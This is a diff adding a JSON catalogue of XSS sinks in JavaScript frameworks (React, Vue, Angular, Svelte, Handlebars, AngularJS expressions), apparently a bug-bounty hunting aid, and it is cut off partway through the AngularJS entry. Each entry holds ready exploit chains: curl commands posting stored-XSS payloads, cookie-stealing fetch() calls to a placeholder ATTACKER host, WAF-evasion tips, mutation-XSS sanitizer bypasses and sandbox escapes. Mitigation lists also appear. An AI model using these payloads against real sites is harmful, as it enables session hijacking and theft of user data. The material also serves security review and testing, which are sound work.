@@ -1,0 +1,733 @@
+{
+  "category": "framework",
+  "schema_version": "2.0",
+  "sinks": [
+    {
+      "id": "sink-react-dangerouslysetinnerhtml",
+      "name": "dangerouslySetInnerHTML",
+      "category": "framework",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "dangerouslySetInnerHTML",
+        "dangerouslysetinnerhtml",
+        "__html",
+        "{__html",
+        "__html:"
+      ],
+      "severity": "P2",
+      "severity_note": "P2 as DOM/stored XSS; on SSR-rendered pages payload <script> executes at parse time (higher reliability than client-side insertion, where inline scripts are inert but event handlers fire).",
+      "explain": "React escapes every value rendered in JSX by default. dangerouslySetInnerHTML={{__html: string}} is the deliberate opt-out: React assigns the string to the element's innerHTML verbatim, with zero sanitization. Any attacker influence over that string is XSS - the framework's protection ends exactly at this prop.",
+      "how_it_works": "Client-side, React sets innerHTML on the DOM node: inline <script> tags do NOT execute (native innerHTML behavior), but <img onerror>, <svg onload>, autofocus/onfocus and friends fire immediately. Server-side (SSR/hydration), the __html string is emitted raw into the initial HTML document - there <script>alert(1)</script> DOES execute at parse time, before React hydrates. Hydration does not re-sanitize; React trusts that server and client markup match, so a payload stored via SSR fires for every first-hit visitor. Also watch for the pattern dangerouslySetInnerHTML with a 'sanitizer' that is really a regex blacklist.",
+      "why_it_matters": "This prop is React's single XSS hole and its name makes it trivial to grep in review. It is used for rich-text renderers, CMS content, and markdown output - precisely the data classes attackers control - and SSR turns it into a reliable stored/reflected XSS with script execution.",
+      "exploitable_when": [
+        "fetch-response",
+        "location.search",
+        "location.hash",
+        "postMessage-data"
+      ],
+      "chains": [
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Confirm the query parameter reaches __html (SSR path)",
+              "payload": "?q=jlf-trace-<b>1</b>",
+              "command": "curl -s 'https://TARGET/search?q=jlf-trace-<b>1</b>' | grep -o 'jlf-trace-<b>1</b>'",
+              "indicator": "the raw, unescaped marker is present in the server-returned HTML body"
+            },
+            {
+              "action": "Deliver an SSR parse-time payload",
+              "payload": "?q=<script>alert(document.domain)</script>",
+              "command": "open 'https://TARGET/search?q=<script>alert(document.domain)</script>' in a browser",
+              "indicator": "the alert fires before/while React hydrates"
+            },
+            {
+              "action": "If client-side only, use an event-handler vector",
+              "payload": "?q=<img src=x onerror=alert(document.domain)>",
+              "command": "open 'https://TARGET/search?q=<img src=x onerror=alert(document.domain)>' in a browser",
+              "indicator": "the alert fires once React assigns innerHTML"
+            }
+          ],
+          "eligibility": "Reflected XSS, accepted on all major platforms. The SSR-vs-client distinction matters for payload choice, not eligibility."
+        },
+        {
+          "source": "fetch-response",
+          "steps": [
+            {
+              "action": "Store a marker in the rich-text field rendered with dangerouslySetInnerHTML",
+              "payload": "<u>jlf-trace</u>",
+              "command": "curl -s -X POST 'https://TARGET/api/posts' -H 'Content-Type: application/json' -H 'Cookie: session=SESSION_ID' --data '{\"body\":\"<u>jlf-trace</u>\"}'",
+              "indicator": "the marker renders underlined on the post page"
+            },
+            {
+              "action": "Store the executable payload",
+              "payload": "<svg onload=fetch('https://ATTACKER/c?c='+document.cookie)>",
+              "command": "curl -s -X POST 'https://TARGET/api/posts' -H 'Content-Type: application/json' -H 'Cookie: session=SESSION_ID' --data '{\"body\":\"<svg onload=fetch(\\'https://ATTACKER/c?c=\\'+document.cookie)>\"}'",
+              "indicator": "every viewer's browser sends their cookie to the ATTACKER listener"
+            }
+          ],
+          "eligibility": "Stored XSS in a CMS/rich-text field, accepted on all major platforms."
+        }
+      ],
+      "contexts": {
+        "html-body": "Client-side: event-handler vectors fire, inline <script> inert. SSR: <script> executes at parse time - prefer it for reliability.",
+        "attr": "If the string is wrapped in markup that places it inside an attribute, break out with '\"><img src=x onerror=alert(document.domain)>'.",
+        "js-string": "If the value passes through a JS string first (e.g. JSON.parse of inline state), escape with '</script><svg onload=alert(1)>' in the SSR document."
+      },
+      "waf_notes": "SSR reflections are visible to server WAFs - mutate case (<ScRiPt>), use <svg onload> instead of <script>, or deliver via stored API fields and hash/postMessage sources that never hit the wire. React's escaping reputation means many codebases apply no secondary filter here.",
+      "eligibility": "XSS through dangerouslySetInnerHTML is accepted on all major platforms; it is unambiguous framework-supported raw HTML. Note honestly whether the trigger is SSR (parse-time execution) or client-side (event-handler vectors only).",
+      "mitigations": [
+        "Avoid dangerouslySetInnerHTML entirely; render structured data with components.",
+        "If unavoidable, sanitize with DOMPurify: dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(data)}}.",
+        "Sanitize again server-side for SSR output and deploy a nonce-based CSP."
+      ],
+      "related": [
+        "innerHTML",
+        "v-html",
+        "unsafeHTML"
+      ],
+      "references": [
+        "React Documentation: dangerouslySetInnerHTML",
+        "PortSwigger: DOM-based XSS",
+        "OWASP: XSS Prevention Cheat Sheet"
+      ]
+    },
+    {
+      "id": "sink-vue-v-html",
+      "name": "v-html",
+      "category": "framework",
+      "languages": [
+        "javascript",
+        "html"
+      ],
+      "patterns": [
+        "v-html",
+        "vhtml",
+        "v-html=",
+        "v-bind:innerHTML",
+        ":innerHTML"
+      ],
+      "severity": "P2",
+      "severity_note": "P2 as DOM/stored XSS; inline <script> inserted via v-html is inert client-side, but event handlers fire immediately; SSR output executes <script> at parse time.",
+      "explain": "Vue escapes mustache interpolations ({{ }}) by default. The v-html directive is the explicit raw-HTML escape hatch: it sets the element's innerHTML from the bound expression with no sanitization. Attacker control of the bound value is direct XSS.",
+      "how_it_works": "v-html compiles to an innerHTML assignment on every update, so payloads fire as soon as the reactive value changes - no reload needed, which suits websocket/live-data exploitation. Inline <script> does not execute through innerHTML assignment, but <img src=x onerror=...> and <svg onload=...> do. In Vue SSR (Nuxt), the v-html value is serialized raw into the server HTML, where <script> executes at parse time. Related pattern: components accepting a 'html' prop and applying v-html internally - trace props, not just template text.",
+      "why_it_matters": "v-html is the standard way Vue apps render markdown, CMS content, and 'trusted' API HTML. It greps cleanly in review, and its reactive-update behavior makes live-channel (chat, notification) exploitation immediate.",
+      "exploitable_when": [
+        "fetch-response",
+        "websocket-message",
+        "location.search",
+        "spa-hash-router-param"
+      ],
+      "chains": [
+        {
+          "source": "websocket-message",
+          "steps": [
+            {
+              "action": "Send a marker through the live channel",
+              "payload": "jlf-trace-<b>1</b>",
+              "command": "send 'jlf-trace-<b>1</b>' as a chat message from account YOUR_ACCOUNT in a second session",
+              "indicator": "the victim session renders the marker bold via v-html"
+            },
+            {
+              "action": "Send the executable payload",
+              "payload": "<svg onload=alert(document.domain)>",
+              "command": "send '<svg onload=alert(document.domain)>' as a chat message from account YOUR_ACCOUNT",
+              "indicator": "the alert fires in all viewing sessions as the reactive list updates - no reload"
+            }
+          ],
+          "eligibility": "Stored/persistent XSS across users, accepted on all major platforms."
+        },
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Confirm the parameter is bound to v-html",
+              "payload": "?content=<u>jlf-trace</u>",
+              "command": "open 'https://TARGET/page?content=<u>jlf-trace</u>' in a browser",
+              "indicator": "underlined 'jlf-trace' renders in the target element"
+            },
+            {
+              "action": "Deliver the payload",
+              "payload": "?content=<img src=x onerror=alert(document.domain)>",
+              "command": "open 'https://TARGET/page?content=<img src=x onerror=alert(document.domain)>' in a browser",
+              "indicator": "the alert fires on render"
+            }
+          ],
+          "eligibility": "Reflected DOM XSS, accepted on all major platforms; check Nuxt SSR - if the marker is in the server HTML, <script> also works."
+        }
+      ],
+      "contexts": {
+        "html-body": "innerHTML assignment: event handlers fire, inline <script> inert client-side, executed on SSR initial document.",
+        "attr": "Break out of attribute-wrapped insertion with '\"><svg onload=alert(document.domain)>'.",
+        "js-string": "If the value transits a JS string (e.g. JSON island hydration), '</script><img src=x onerror=alert(1)>' escapes at SSR parse time."
+      },
+      "waf_notes": "Reactive updates driven by websockets/fetch bypass request WAFs entirely. For SSR reflections, standard mutations (case, <svg>, nested broken tags) apply; Vue itself provides zero filtering to bypass.",
+      "eligibility": "Accepted on all major platforms as DOM/stored XSS. A v-html on data provably only settable by the same user (own profile seen by nobody else) is self-XSS and usually NOT eligible.",
+      "mitigations": [
+        "Never bind user data with v-html; use mustache interpolation or a markdown renderer with a strict schema.",
+        "Sanitize with DOMPurify: v-html=\"$sanitize ? $sanitize(raw) : ''\" or a computed wrapping DOMPurify.sanitize(raw).",
+        "Enforce a nonce-based CSP."
+      ],
+      "related": [
+        "dangerouslySetInnerHTML",
+        "innerHTML",
+        "ng-bind-html"
+      ],
+      "references": [
+        "Vue.js Documentation: Security - v-html",
+        "PortSwigger: DOM-based XSS",
+        "OWASP: XSS Prevention Cheat Sheet"
+      ]
+    },
+    {
+      "id": "sink-angular-ng-bind-html",
+      "name": "ng-bind-html",
+      "category": "framework",
+      "languages": [
+        "javascript",
+        "html"
+      ],
+      "patterns": [
+        "ng-bind-html",
+        "ngbindhtml",
+        "ng-bind-html=",
+        "[innerHTML]",
+        "bind-innerHTML"
+      ],
+      "severity": "P3",
+      "severity_note": "P3 baseline because the AngularJS $sanitize pipeline (ngSanitize) strips most vectors; P2 when the bound value is pre-wrapped with $sce.trustAsHtml (or a sanitizer bypass applies to the exact AngularJS version). Angular 2+ [innerHTML] is sanitized by DomSanitizer - escalation needs bypassSecurityTrustHtml upstream.",
+      "explain": "ng-bind-html renders a bound expression as HTML inside the element (AngularJS 1.x, with ngSanitize loaded, the value passes through $sanitize; without ngSanitize the app must trust the value via $sce). In Angular 2+ the equivalent is the [innerHTML] property binding, sanitized by DomSanitizer. Both are framework-sanctioned HTML renderers whose safety depends entirely on configuration and the sanitizer's strength for that version.",
+      "how_it_works": "AngularJS $sanitize parses the HTML and whitelists tags/attributes - historically bypassed repeatedly (mutation-XSS via nested/namespace-confused markup against specific 1.x versions). If the code instead calls $sce.trustAsHtml(userValue) before binding, sanitization is skipped entirely and any markup executes. Angular 2+ DomSanitizer.sanitize(SecurityContext.HTML, ...) similarly whitelists; bypassSecurityTrustHtml(value) marks a string exempt. The review question is never 'is ng-bind-html present' but 'was the value trusted or does this version's sanitizer have a known bypass'.",
+      "why_it_matters": "This is the standard rich-text renderer in Angular apps. The presence of trustAsHtml/bypassSecurityTrustHtml one hop upstream converts it into unconditional XSS, and legacy AngularJS apps pinned to old 1.x versions carry published sanitizer bypasses.",
+      "exploitable_when": [
+        "fetch-response",
+        "location.search",
+        "dom-form-values",
+        "localStorage"
+      ],
+      "chains": [
+        {
+          "source": "fetch-response",
+          "steps": [
+            {
+              "action": "Confirm the field renders through ng-bind-html / [innerHTML]",
+              "payload": "<u>jlf-trace</u>",
+              "command": "curl -s -X POST 'https://TARGET/api/articles' -H 'Content-Type: application/json' -H 'Cookie: session=SESSION_ID' --data '{\"body\":\"<u>jlf-trace</u>\"}' and open the article page",
+              "indicator": "the marker renders underlined (whitelisted markup passes the sanitizer)"
+            },
+            {
+              "action": "Test whether sanitization is actually active",
+              "payload": "<img src=x onerror=alert(document.domain)>",
+              "command": "curl -s -X POST 'https://TARGET/api/articles' -H 'Content-Type: application/json' -H 'Cookie: session=SESSION_ID' --data '{\"body\":\"<img src=x onerror=alert(document.domain)>\"}'",
+              "indicator": "if the alert fires, the value was trusted upstream (trustAsHtml/bypassSecurityTrustHtml) - full stored XSS"
+            },
+            {
+              "action": "If the alert does not fire, probe the sanitizer for the app's exact version",
+              "payload": "<math><mtext><table><mglyph><style><img src=x onerror=alert(document.domain)>",
+              "command": "curl -s -X POST 'https://TARGET/api/articles' -H 'Content-Type: application/json' -H 'Cookie: session=SESSION_ID' --data '{\"body\":\"<math><mtext><table><mglyph><style><img src=x onerror=alert(document.domain)>\"}'",
+              "indicator": "mutation-XSS fires when the AngularJS version's $sanitize has the published namespace-confusion bypass (verify version via angular.version.full in console)"
+            }
+          ],
+          "eligibility": "Trusted-value case: stored XSS accepted everywhere. Sanitizer-bypass case: accepted with a working version-matched PoC; without one, report as hardening/informational."
+        },
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Confirm the parameter is bound into ng-bind-html with a trusted wrapper",
+              "payload": "?bio=<b>jlf-trace</b>",
+              "command": "open 'https://TARGET/preview?bio=<b>jlf-trace</b>' in a browser",
+              "indicator": "the marker renders bold; then inspect the controller for $sce.trustAsHtml around the parameter"
+            },
+            {
+              "action": "Deliver the payload",
+              "payload": "?bio=<svg onload=alert(document.domain)>",
+              "command": "open 'https://TARGET/preview?bio=<svg onload=alert(document.domain)>' in a browser",
+              "indicator": "the alert fires, confirming trust-wrapping of attacker data"
+            }
+          ],
+          "eligibility": "Reflected XSS, accepted on all major platforms when trust-wrapping is shown in code; without it, severity follows the sanitizer story."
+        }
+      ],
+      "contexts": {
+        "html-body": "Sanitized HTML context: whitelisted tags pass; event handlers pass only when the value is trusted or a version-specific sanitizer bypass applies.",
+        "attr": "Sanitizer strips attribute breakout in untrusted mode; in trusted mode '\"><img src=x onerror=alert(1)>' works.",
+        "js-string": "Not the primary path; if the HTML value transits an inline script before binding, '</script>' breakout applies at initial parse."
+      },
+      "waf_notes": "Server WAFs see only the stored/reflected parameter; mutation-XSS payloads (math/mglyph/style nesting) evade most regex filters by design. Deliver via stored API fields to skip request inspection altogether.",
+      "eligibility": "Honest rating: plain ng-bind-html with a current sanitizer and no trust call is usually NOT a vulnerability - the finding lives or dies on (a) trustAsHtml/bypassSecurityTrustHtml upstream or (b) a version-matched sanitizer bypass PoC. State angular.version.full / the Angular version in the report.",
+      "mitigations": [
+        "Never wrap user data in $sce.trustAsHtml / bypassSecurityTrustHtml.",
+        "Keep ngSanitize and AngularJS/Angular updated; migrate off end-of-life AngularJS 1.x.",
+        "Add DOMPurify before binding for defense in depth, plus a nonce-based CSP."
+      ],
+      "related": [
+        "$sce.trustAsHtml",
+        "innerHTML",
+        "v-html",
+        "dangerouslySetInnerHTML"
+      ],
+      "references": [
+        "PortSwigger: DOM-based XSS",
+        "OWASP: XSS Filter Evasion Cheat Sheet",
+        "Angular Documentation: Security - Sanitization"
+      ]
+    },
+    {
+      "id": "sink-angular-sce-bypass",
+      "name": "$sce.trustAsHtml",
+      "category": "framework",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "trustAsHtml",
+        "$sce.trustAsHtml",
+        "sce.trustAsHtml",
+        "bypassSecurityTrustHtml",
+        "$sce.trustAs",
+        "trustAs"
+      ],
+      "severity": "P2",
+      "severity_note": "P2 when applied to any attacker-influenced string - it disables the framework sanitizer by design; not exploitable on its own, it is the upstream switch that arms ng-bind-html/[innerHTML].",
+      "explain": "$sce.trustAsHtml(value) (AngularJS) and DomSanitizer.bypassSecurityTrustHtml(value) (Angular 2+) wrap a string in a 'trusted' object the framework will render verbatim, skipping all sanitization. Reviewing these calls is reviewing the single decision that turns a sanitized binding into raw-HTML XSS.",
+      "how_it_works": "AngularJS's Strict Contextual Escaping normally rejects untrusted strings in HTML contexts; trustAsHtml asserts 'I vouch for this'. The same holds for Angular's DomSanitizer: bypassSecurityTrustHtml produces a SafeHtml the renderer assigns without filtering. Typical vulnerable pattern: vm.body = $sce.trustAsHtml($routeParams.body) or a shared helper safeHtml(s) { return $sce.trustAsHtml(s); } applied indiscriminately. Once trusted, every markup vector (<img onerror>, <svg onload>, <script> in SSR/initial parse) executes. The $sce.trustAsJs variant is worse: it permits the value as executable JavaScript.",
+      "why_it_matters": "These functions are grep-able red flags: any occurrence within reach of user data is a finding. They are common in legacy dashboards rendering 'admin-entered' HTML that later became editable by lower-privilege or external users.",
+      "exploitable_when": [
+        "location.search",
+        "fetch-response",
+        "spa-hash-router-param",
+        "document.referrer"
+      ],
+      "chains": [
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Locate trustAsHtml/bypassSecurityTrustHtml applied to a request-derived value",
+              "payload": "?content=jlf-trace-<b>1</b>",
+              "command": "open 'https://TARGET/view?content=jlf-trace-<b>1</b>' in a browser and grep the JS bundle for trustAsHtml",
+              "indicator": "the marker renders as markup AND the bundle shows $sce.trustAsHtml(param) in the render path"
+            },
+            {
+              "action": "Deliver the payload",
+              "payload": "?content=<img src=x onerror=alert(document.domain)>",
+              "command": "open 'https://TARGET/view?content=<img src=x onerror=alert(document.domain)>' in a browser",
+              "indicator": "the alert fires on render"
+            }
+          ],
+          "eligibility": "Reflected XSS, accepted on all major platforms; code evidence of trust-on-input makes it uncontroversial."
+        },
+        {
+          "source": "fetch-response",
+          "steps": [
+            {
+              "action": "Store a marker in the field that the app trusts before binding",
+              "payload": "<i>jlf-trace</i>",
+              "command": "curl -s -X POST 'https://TARGET/api/pages' -H 'Content-Type: application/json' -H 'Cookie: session=SESSION_ID' --data '{\"html\":\"<i>jlf-trace</i>\"}'",
+              "indicator": "the marker renders italicized for other viewers"
+            },
+            {
+              "action": "Store the executable payload",
+              "payload": "<svg onload=fetch('https://ATTACKER/c?c='+document.cookie)>",
+              "command": "curl -s -X POST 'https://TARGET/api/pages' -H 'Content-Type: application/json' -H 'Cookie: session=SESSION_ID' --data '{\"html\":\"<svg onload=fetch(\\'https://ATTACKER/c?c=\\'+document.cookie)>\"}'",
+              "indicator": "the ATTACKER listener receives cookies from every viewer"
+            }
+          ],
+          "eligibility": "Stored XSS, accepted on all major platforms."
+        }
+      ],
+      "contexts": {
+        "html-body": "Trusted raw HTML: all markup vectors execute; on server-rendered first paint <script> also runs.",
+        "attr": "'\"><svg onload=alert(document.domain)>' breaks out when the trusted string is templated inside an attribute.",
+        "js-string": "With $sce.trustAsJs the value is executed as JavaScript - inject ';alert(document.domain)// directly."
+      },
+      "waf_notes": "The bypass is server-/client-side logic, so payload-shape WAF rules are the only obstacle: mutate tags, use event vectors over <script>, and prefer stored delivery to avoid reflection inspection.",
+      "eligibility": "Accepted on all major platforms when a reachable attacker-controlled input flows through the trust call. A trust call applied only to static, developer-controlled constants is safe - verify the data flow before reporting.",
+      "mitigations": [
+        "Delete trust wrappers around anything user-derived; bind through the default sanitizer instead.",
+        "If raw HTML is a business requirement, sanitize with DOMPurify before trusting.",
+        "Centralize and audit every trustAsHtml/bypassSecurityTrustHtml call in CI."
+      ],
+      "related": [
+        "ng-bind-html",
+        "innerHTML",
+        "v-html",
+        "dangerouslySetInnerHTML"
+      ],
+      "references": [
+        "AngularJS Documentation: $sce",
+        "Angular Documentation: Security - Bypassing Sanitization",
+        "PortSwigger: DOM-based XSS"
+      ]
+    },
+    {
+      "id": "sink-svelte-html-tag",
+      "name": "{@html}",
+      "category": "framework",
+      "languages": [
+        "javascript",
+        "html"
+      ],
+      "patterns": [
+        "{@html",
+        "@html",
+        "{@html }",
+        "svelte {@html"
+      ],
+      "severity": "P2",
+      "severity_note": "P2 as DOM/stored XSS; Svelte applies zero sanitization to {@html}. Client-side insertion makes inline <script> inert but event handlers fire; SvelteKit SSR emits the string raw into the initial document where <script> executes at parse time.",
+      "explain": "Svelte escapes {expression} output by default. The {@html expression} tag is the explicit raw-HTML directive: the string is inserted into the DOM as markup with no filtering. Any attacker influence over the expression is XSS.",
+      "how_it_works": "At compile time {@html x} becomes an insertion of the raw string into the target node. During SSR (SvelteKit), the value is concatenated directly into the response HTML - <script>alert(document.domain)</script> in the value executes when the browser parses the initial page, before hydration. Client-side updates assign markup like innerHTML: event attributes (onerror, onload) fire, inline scripts do not. Grep for {@html in .svelte files; also watch components wrapping it (a 'RichText' component is often just {@html content} inside).",
+      "why_it_matters": "{@html} is the only HTML-injection primitive in Svelte and is used for markdown/CMS rendering - attacker-controlled data classes. SvelteKit SSR makes the highest-reliability case (parse-time script execution) the default architecture.",
+      "exploitable_when": [
+        "fetch-response",
+        "location.search",
+        "spa-hash-router-param",
+        "postMessage-data"
+      ],
+      "chains": [
+        {
+          "source": "fetch-response",
+          "steps": [
+            {
+              "action": "Store a marker in the CMS field rendered via {@html}",
+              "payload": "<u>jlf-trace</u>",
+              "command": "curl -s -X POST 'https://TARGET/api/content' -H 'Content-Type: application/json' -H 'Cookie: session=SESSION_ID' --data '{\"body\":\"<u>jlf-trace</u>\"}'",
+              "indicator": "the marker renders underlined on the public page"
+            },
+            {
+              "action": "Store an SSR parse-time payload",
+              "payload": "<script>alert(document.domain)</script>",
+              "command": "curl -s -X POST 'https://TARGET/api/content' -H 'Content-Type: application/json' -H 'Cookie: session=SESSION_ID' --data '{\"body\":\"<script>alert(document.domain)</script>\"}'",
+              "indicator": "the alert fires on first load for every visitor (SvelteKit SSR emits it raw)"
+            },
+            {
+              "action": "For pure client-side rendering, use an event vector instead",
+              "payload": "<img src=x onerror=fetch('https://ATTACKER/c?c='+document.cookie)>",
+              "command": "curl -s -X POST 'https://TARGET/api/content' -H 'Content-Type: application/json' -H 'Cookie: session=SESSION_ID' --data '{\"body\":\"<img src=x onerror=fetch(\\'https://ATTACKER/c?c=\\'+document.cookie)>\"}'",
+              "indicator": "the ATTACKER listener receives viewer cookies"
+            }
+          ],
+          "eligibility": "Stored XSS, accepted on all major platforms; note in the report whether execution is SSR parse-time or client event-handler."
+        },
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Confirm the parameter reaches a {@html} tag",
+              "payload": "?preview=<b>jlf-trace</b>",
+              "command": "curl -s 'https://TARGET/preview?preview=<b>jlf-trace</b>' | grep -o '<b>jlf-trace</b>'",
+              "indicator": "the unescaped marker is in the server HTML response"
+            },
+            {
+              "action": "Deliver the payload",
+              "payload": "?preview=<svg onload=alert(document.domain)>",
+              "command": "open 'https://TARGET/preview?preview=<svg onload=alert(document.domain)>' in a browser",
+              "indicator": "the alert fires on load"
+            }
+          ],
+          "eligibility": "Reflected XSS, accepted on all major platforms."
+        }
+      ],
+      "contexts": {
+        "html-body": "Raw markup insertion: event handlers always fire; <script> fires only in SSR output or if later moved via a script-executing API.",
+        "attr": "If the {@html} output is templated inside an attribute context, '\"><img src=x onerror=alert(1)>' breaks out.",
+        "js-string": "If the value transits a hydration JSON island, '</script><svg onload=alert(1)>' escapes during SSR parse."
+      },
+      "waf_notes": "Stored delivery through the API avoids reflection filters. For SSR reflections, mutate tag case and prefer <svg onload> to defeat naive <script> rules; Svelte provides no filtering of its own.",
+      "eligibility": "Accepted on all major platforms as stored/reflected XSS. Self-rendered previews visible only to the author are self-XSS and usually NOT eligible unless another role views them.",
+      "mitigations": [
+        "Avoid {@html} for user data; render markdown through a strict schema-based renderer.",
+        "Sanitize with DOMPurify before interpolation: {@html DOMPurify.sanitize(content)}.",
+        "Nonce-based CSP as a second line for SSR output."
+      ],
+      "related": [
+        "innerHTML",
+        "dangerouslySetInnerHTML",
+        "v-html",
+        "unsafeHTML"
+      ],
+      "references": [
+        "Svelte Documentation: {@html ...}",
+        "PortSwigger: DOM-based XSS",
+        "OWASP: XSS Prevention Cheat Sheet"
+      ]
+    },
+    {
+      "id": "sink-handlebars-triple-stash",
+      "name": "{{{ }}}",
+      "category": "framework",
+      "languages": [
+        "javascript",
+        "html"
+      ],
+      "patterns": [
+        "{{{",
+        "}}}",
+        "triple-stash",
+        "Handlebars.SafeString",
+        "SafeString"
+      ],
+      "severity": "P2",
+      "severity_note": "P2 when server-rendered (reflected/stored XSS in the response body) or client-rendered with attacker data; P3 if only reachable through precompiled admin templates with no user data flow.",
+      "explain": "Handlebars escapes {{value}} interpolations by default. Triple-stash {{{value}}} disables escaping and emits the value as raw markup - the same effect as Handlebars.SafeString wrapping on the data side. Any user-controlled value rendered through either mechanism is XSS.",
+      "how_it_works": "In server-side Node/Express apps, {{{body}}} with a request-derived value is textbook reflected or stored XSS delivered in the HTTP response - <script> executes at parse time, no DOM tricks needed. Client-side, templates compiled with Handlebars.compile and rendered with attacker data produce the same raw string, then insert it (usually via innerHTML), where event-handler vectors fire. SafeString is the data-side twin: new Handlebars.SafeString(userValue) marks the value escape-exempt, so grep both {{{ and SafeString. Note the Ember variant (htmlSafe) follows the same rule.",
+      "why_it_matters": "Triple-stash and SafeString are deliberate escaping bypasses that appear in email templates, PDF/HTML report generators, and CMS themes - server-rendered paths that many client-side-focused reviewers skip, yet they yield the most reliable XSS class (parse-time script execution).",
+      "exploitable_when": [
+        "location.search",
+        "fetch-response",
+        "dom-form-values",
+        "location.pathname"
+      ],
+      "chains": [
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Confirm the parameter renders unescaped (triple-stash)",
+              "payload": "?name=jlf-trace-<b>1</b>",
+              "command": "curl -s 'https://TARGET/greet?name=jlf-trace-<b>1</b>' | grep -o 'jlf-trace-<b>1</b>'",
+              "indicator": "the raw marker is in the response body (compare: an escaped render would show &lt;b&gt;)"
+            },
+            {
+              "action": "Deliver the payload",
+              "payload": "?name=<script>alert(document.domain)</script>",
+              "command": "open 'https://TARGET/greet?name=<script>alert(document.domain)</script>' in a browser",
+              "indicator": "the alert fires at parse time"
+            }
+          ],
+          "eligibility": "Reflected XSS, accepted on all major platforms; server-rendered parse-time execution makes this uncontroversial."
+        },
+        {
+          "source": "fetch-response",
+          "steps": [
+            {
+              "action": "Store a marker in the field rendered through the triple-stash template",
+              "payload": "<u>jlf-trace</u>",
+              "command": "curl -s -X POST 'https://TARGET/api/profile' -H 'Content-Type: application/json' -H 'Cookie: session=SESSION_ID' --data '{\"signature\":\"<u>jlf-trace</u>\"}'",
+              "indicator": "the marker renders underlined on the public profile"
+            },
+            {
+              "action": "Store the executable payload",
+              "payload": "<img src=x onerror=fetch('https://ATTACKER/c?c='+document.cookie)>",
+              "command": "curl -s -X POST 'https://TARGET/api/profile' -H 'Content-Type: application/json' -H 'Cookie: session=SESSION_ID' --data '{\"signature\":\"<img src=x onerror=fetch(\\'https://ATTACKER/c?c=\\'+document.cookie)>\"}'",
+              "indicator": "the ATTACKER listener receives cookies from profile viewers"
+            }
+          ],
+          "eligibility": "Stored XSS, accepted on all major platforms when other users view the rendered page."
+        }
+      ],
+      "contexts": {
+        "html-body": "Raw emission into the HTML response: every vector works, including parse-time <script> when server-rendered.",
+        "attr": "If the stash sits inside an attribute (e.g. <div title=\"{{{v}}}\">), break out with '\"><svg onload=alert(document.domain)>'.",
+        "js-string": "If the stash lands inside an inline <script> string, close it with '</script><img src=x onerror=alert(1)>'."
+      },
+      "waf_notes": "Reflected parameters are WAF-visible: mutate markup, prefer stored fields, or use attribute-context breakouts that avoid literal '<script>'. SafeString data flows arrive via APIs (JSON), which many WAFs inspect poorly.",
+      "eligibility": "Server-rendered reflected/stored XSS is accepted on all major platforms. Client-side-only templates fed exclusively by the victim's own input are self-XSS and usually NOT eligible.",
+      "mitigations": [
+        "Use {{ }} (double-stash) for all user data; reserve {{{ }}} for static, developer-controlled markup.",
+        "Remove SafeString wrapping of user-derived values.",
+        "Sanitize unavoidable raw HTML with DOMPurify (client) or a server-side sanitizer before rendering."
+      ],
+      "related": [
+        "innerHTML",
+        "v-html",
+        "document.write"
+      ],
+      "references": [
+        "PortSwigger: Cross-site scripting",
+        "OWASP: XSS Prevention Cheat Sheet",
+        "HackTricks: XSS (Cross Site Scripting)"
+      ]
+    },
+    {
+      "id": "sink-angularjs-expression-sandbox",
+      "name": "{{ }}",
+      "category": "framework",
+      "languages": [
+        "javascript",
+        "html"
+      ],
+      "patterns": [
+        "{{",
+        "}}",
+        "ng-app",
+        "angularjs expression",
+        "{{constructor.constructor"
+      ],
+      "severity": "P3",
+      "severity_note": "Severity is version-dependent: P2 on AngularJS >= 1.6 (sandbox removed - {{constructor.constructor('alert(1)')()}} executes directly) and on <= 1.1.5 (no sandbox); P3-P4 on 1.2-1.5 where a version-matched sandbox escape must be demonstrated; bare {{7*7}} arithmetic alone is often triaged as low/informational.",
+      "explain": "Client-Side Template Injection (CSTI) in AngularJS: if an application reflects user input into the DOM inside an ng-app scope before AngularJS compiles it, an attacker can inject {{ }} expressions that AngularJS evaluates. Escalating from expression evaluation to JavaScript execution requires defeating (or the absence of) the AngularJS expression sandbox, which is entirely version-dependent.",
+      "how_it_works": "AngularJS parses {{expression}} bindings during the $compile phase. Server-side reflection of parameters (e.g. ?name={{7*7}} rendered into the HTML inside an ng-app element) lets the attacker supply those bindings. The sandbox restricts access to window/constructor: AngularJS <= 1.1.5 had NO sandbox (direct {{constructor.constructor('alert(1)')()}}); 1.2.x-1.5.x shipped successive sandboxes, each publicly bypassed (e.g. the 1.2.x Gareth Heyes escape using Function.call chains via object accessors); 1.6.0 REMOVED the sandbox entirely, making expression injection equivalent to arbitrary JS again ({{constructor.constructor('alert(document.domain)')()}} works). Check the exact version with angular.version.full in the console before choosing the escape.",
+      "why_it_matters": "CSTI is the framework-specific XSS class for the massive installed base of AngularJS 1.x apps (end-of-life since 2022, still widely deployed). Honest exploitation requires matching the escape to the running version - a strong report always states angular.version.full and shows the working chain for that version.",
+      "exploitable_when": [
+        "location.search",
+        "location.hash",
+        "spa-hash-router-param",
+        "document.referrer"
+      ],
+      "chains": [
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Confirm CSTI with arithmetic evaluation",
+              "payload": "?name={{7*7}}",
+              "command": "open 'https://TARGET/profile?name={{7*7}}' in a browser",
+              "indicator": "the page renders '49' instead of the literal '{{7*7}}' - the expression was evaluated inside an ng-app scope"
+            },
+            {
+              "action": "Fingerprint the AngularJS version",
+              "payload": "angular.version.full",
+              "command": "in DevTools console on https://TARGET run: angular.version.full",
+              "indicator": "the exact version string (e.g. '1.6.10') selects which escape applies"
+            },
+            {
+              "action": "Exploit on AngularJS >= 1.6 or <= 1.1.5 (sandbox absent)",
+              "payload": "?name={{constructor.constructor('alert(document.domain)')()}}",
+              "command": "open 'https://TARGET/profile?name={{constructor.constructor('alert(document.domain)')()}}' in a browser",
+              "indicator": "the alert fires - full JS execution"
+            },
+            {
+              "action": "Exploit on AngularJS 1.2.x (sandboxed) with the version-matched escape",
